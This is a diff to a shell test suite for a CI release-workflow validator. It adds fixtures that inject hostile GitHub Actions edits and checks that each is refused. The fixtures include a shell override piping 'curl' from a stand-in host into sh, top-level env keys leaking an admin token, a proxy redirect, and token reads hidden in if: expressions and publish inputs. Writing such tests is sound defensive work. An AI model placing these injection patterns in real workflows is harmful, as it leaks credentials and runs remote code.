@@ -2862,6 +2862,73 @@ lines[at:at + 1] = [
 open(path, "w", encoding="utf-8").write("".join(lines))
 PY
 }
+# Workflow-level keys are the generator's set. A quoted or spaced `env` key
+# passed the literal `^env:` greps, and one placed after `jobs:` was outside
+# the lines the workflow-scope scan read, so a secret reached every job.
+add_top_level_entry() {
+  # add_top_level_entry <dir> <before-jobs|after-jobs> <line>...
+  python3 - "$1/.github/workflows/release.yml" "$2" "${@:3}" <<'PY'
+import sys
+
+path, where, *entry = sys.argv[1:]
+text = open(path, encoding="utf-8").read()
+block = "".join(line + "\n" for line in entry)
+if where == "before-jobs":
+    if text.count("\njobs:\n") != 1:
+        raise SystemExit("the release caller lost its jobs key")
+    text = text.replace("\njobs:\n", "\n" + block + "jobs:\n", 1)
+elif where == "after-jobs":
+    text = text.rstrip("\n") + "\n" + block
+else:
+    raise SystemExit("unknown position " + where)
+open(path, "w", encoding="utf-8").write(text)
+PY
+}
+# A generated top-level key moved after `jobs:` keeps the key set intact, so
+# only a scan of every line outside the jobs block sees the token read in it.
+move_run_name_after_jobs() {
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+text = open(path, encoding="utf-8").read()
+old = "run-name: Release ${{ inputs.version }} ${{ inputs.selector_digest || 'manual' }}\n"
+if text.count(old) != 1:
+    raise SystemExit("the release caller lost its run-name")
+text = text.replace(old, "", 1).rstrip("\n") + "\n" + old.rstrip("\n") + " ${{ github.token }}\n"
+open(path, "w", encoding="utf-8").write(text)
+PY
+}
+# A step `if:` is evaluated as an expression with or without `${{ }}`, so the
+# context scan reads every `if:` value as expression code.
+verify_step_if() {
+  # verify_step_if <dir> <replacement line>...
+  python3 - "$1/.github/workflows/release.yml" "${@:2}" <<'PY'
+import sys
+
+path, *replacement = sys.argv[1:]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+at = lines.index("      - name: Run dependency lifecycle scripts without credentials\n", lines.index("  verify:\n")) + 1
+if lines[at] != "        if: steps.release-version.outputs.selected == 'true'\n":
+    raise SystemExit("the lifecycle step lost its if line")
+lines[at:at + 1] = [line + "\n" for line in replacement]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+# The publish job is generator-determined, so it is pinned whole. A substring
+# check of each `with:` input accepted a secret appended to a generated value.
+publish_with_input() {
+  # publish_with_input <dir> <generated line> <replacement line>
+  python3 - "$1/.github/workflows/release.yml" "$2" "$3" <<'PY'
+import sys
+
+path, old, new = sys.argv[1:]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+at = lines.index(old + "\n", lines.index("  publish:\n"))
+lines[at] = new + "\n"
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
 build_matrix_dependency_index_changed() {
   sed -i 's/^            dependency-index: 0$/            dependency-index: 1/' "$1/.github/workflows/release.yml"
 }
@@ -4508,6 +4575,125 @@ sync_last_rejection
 grep -qF 'an expression left open at the end of its scalar' "$tmproot/run.out" \
   && pass "the release-shape check refuses an expression string left open over closing braces" \
   || fail "an expression string left open over closing braces in the verify job was not refused for that reason: $(tail -2 "$tmproot/run.out")"
+# shellcheck disable=SC2016 # each entry is literal YAML for the fixture, never expanded
+{
+  expect_rejection 'a top-level "env" key before jobs reading a secret' \
+    add_top_level_entry before-jobs '"env":' '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  sync_last_rejection
+  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
+    && pass 'the release-shape check refuses a top-level "env" key before jobs' \
+    || fail "a top-level \"env\" key before jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a top-level "env" key after jobs reading a secret' \
+    add_top_level_entry after-jobs '"env":' '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  sync_last_rejection
+  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
+    && pass 'the release-shape check refuses a top-level "env" key after jobs' \
+    || fail "a top-level \"env\" key after jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  expect_rejection "a top-level 'env' key before jobs reading a secret" \
+    add_top_level_entry before-jobs "'env':" '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  sync_last_rejection
+  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
+    && pass "the release-shape check refuses a top-level 'env' key before jobs" \
+    || fail "a top-level 'env' key before jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  expect_rejection "a top-level 'env' key after jobs reading a secret" \
+    add_top_level_entry after-jobs "'env':" '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  sync_last_rejection
+  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
+    && pass "the release-shape check refuses a top-level 'env' key after jobs" \
+    || fail "a top-level 'env' key after jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a top-level spaced env key before jobs reading a secret' \
+    add_top_level_entry before-jobs 'env :' '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  sync_last_rejection
+  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
+    && pass 'the release-shape check refuses a top-level spaced env key before jobs' \
+    || fail "a top-level spaced env key before jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a top-level spaced env key after jobs reading a secret' \
+    add_top_level_entry after-jobs 'env :' '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  sync_last_rejection
+  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
+    && pass 'the release-shape check refuses a top-level spaced env key after jobs' \
+    || fail "a top-level spaced env key after jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a top-level "defaults" key after jobs overriding the run shell' \
+    add_top_level_entry after-jobs '"defaults":' '  run:' '    shell: bash -c "curl -sf https://example.invalid | sh; {0}"'
+  sync_last_rejection
+  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
+    && pass 'the release-shape check refuses a top-level "defaults" key after jobs' \
+    || fail "a top-level \"defaults\" key after jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  # No context read and no variable on the credential-sensitive list: only the
+  # key set sees a workflow environment that routes the credentialed
+  # acquisition's registry traffic through a caller-chosen proxy.
+  expect_rejection 'a top-level "env" key after jobs setting a proxy' \
+    add_top_level_entry after-jobs '"env":' '  HTTPS_PROXY: http://proxy.example.invalid:8080'
+  sync_last_rejection
+  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
+    && pass 'the release-shape check refuses a top-level "env" key setting a proxy' \
+    || fail "a top-level \"env\" key setting a proxy after jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a generated run-name moved after jobs reading the token' move_run_name_after_jobs
+  sync_last_rejection
+  grep -qF 'exposes a GitHub token at workflow scope (#1712)' "$tmproot/run.out" \
+    && pass 'the workflow-scope scan reads a generated key moved after jobs' \
+    || fail "a token read in a run-name moved after jobs was not refused by the workflow-scope scan: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a verify step bare if reading the token' verify_step_if \
+    "        if: steps.release-version.outputs.selected == 'true' || contains(github.TOKEN, 'x')"
+  sync_last_rejection
+  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
+    && pass 'the verify-job context scan reads a bare if as an expression' \
+    || fail "a token read in a bare verify step if was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a verify step wrapped if reading the token' verify_step_if \
+    "        if: \${{ steps.release-version.outputs.selected == 'true' || contains(github.TOKEN, 'x') }}"
+  sync_last_rejection
+  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
+    && pass 'the verify-job context scan reads a wrapped if' \
+    || fail "a token read in a wrapped verify step if was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a verify step double-quoted if reading the token' verify_step_if \
+    "        if: \"steps.release-version.outputs.selected == 'true' || contains(github.TOKEN, 'x')\""
+  sync_last_rejection
+  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
+    && pass 'the verify-job context scan reads a double-quoted if as an expression' \
+    || fail "a token read in a double-quoted verify step if was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
+  # A single-quoted YAML value read as expression text would be one string
+  # literal, so its delimiters are stripped before the scan.
+  expect_rejection 'a verify step single-quoted if reading the token' verify_step_if \
+    "        if: 'success() || contains(github.TOKEN, github.sha)'"
+  sync_last_rejection
+  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
+    && pass 'the verify-job context scan reads a single-quoted if as an expression' \
+    || fail "a token read in a single-quoted verify step if was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a verify step if continued onto the next line reading the token' verify_step_if \
+    "        if: steps.release-version.outputs.selected == 'true' ||" \
+    "          contains(github.TOKEN, 'x')"
+  sync_last_rejection
+  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
+    && pass 'the verify-job context scan reads an if continued onto the next line' \
+    || fail "a token read on a continued verify step if line was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a publish prefix input with a secret appended' publish_with_input \
+    '      prefix: ${{ inputs.prefix }}' \
+    '      prefix: ${{ inputs.prefix }}${{ secrets.ORG_ADMIN_TOKEN }}'
+  sync_last_rejection
+  grep -qF 'publish job is not the generated publish job (ADR 0099)' "$tmproot/run.out" \
+    && pass 'the publish job pin refuses a secret appended to a generated input' \
+    || fail "a secret appended to the publish prefix input was not refused by the publish pin: $(tail -2 "$tmproot/run.out")"
+  expect_rejection 'a publish version input with the token appended' publish_with_input \
+    '      version: ${{ needs.verify.outputs.version }}' \
+    '      version: ${{ needs.verify.outputs.version }}${{ github.token }}'
+  sync_last_rejection
+  grep -qF 'publish job is not the generated publish job (ADR 0099)' "$tmproot/run.out" \
+    && pass 'the publish job pin refuses the token appended to a generated input' \
+    || fail "the token appended to the publish version input was not refused by the publish pin: $(tail -2 "$tmproot/run.out")"
+}
+publish_snapshot_version_token() {
+  publish_with_input "$1" \
+    '          VERSION: ${{ needs.verify.outputs.version }}' \
+    '          VERSION: ${{ needs.verify.outputs.version }}${{ github.token }}'
+}
+expect_release_mode_rejection release-snapshot \
+  "a release-snapshot publish env value with the token appended" \
+  publish_snapshot_version_token \
+  'publish job is not the generated publish job (ADR 0099)'
+expect_release_mode_rejection release-artifact \
+  "a release-artifact publish env value with the token appended" \
+  publish_snapshot_version_token \
+  'publish job is not the generated publish job (ADR 0099)'
 expect_rejection "a verify step env value with a doubled quote that moves where an expression ends" verify_escaped_single_quote_expression
 sync_last_rejection
 grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
